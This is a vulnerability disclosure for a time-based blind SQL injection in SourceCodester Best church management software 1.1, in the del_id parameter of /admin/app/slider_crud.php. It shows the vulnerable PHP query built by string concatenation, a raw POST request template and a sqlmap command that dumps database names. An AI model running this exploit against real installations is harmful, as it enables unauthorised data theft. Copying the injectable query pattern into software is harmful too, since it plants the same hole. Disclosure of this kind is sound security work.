# Code Source
https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
# Description
A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in /admin/app/slider_crud.php. Affected is file /admin/app/slider_crud.php,The manipulation of the argument `del_id` leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.

# Request
```
POST /admin/app/slider_crud.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

del_id=*
```

# Affect code
```php
... ...
if (isset($_POST['del_id'])) 
  {
      $stmt = $conn->prepare("UPDATE `slider` SET delete_status='1' where id='".$_POST['del_id']."' ");
      $stmt->execute();
      $_SESSION['delete']="delete";
      header("location:../manage_slider.php" ); 
  }
... ...
```

# Exploit
`python sqlmap.py -r 1.txt --dbs`
![图片](https://github.com/user-attachments/assets/a4a1f8b1-6ce1-4eef-8828-b7b3067a16fc)
![图片](https://github.com/user-attachments/assets/eb26ff3a-19a4-4f4e-acb1-cf3c936fa840)

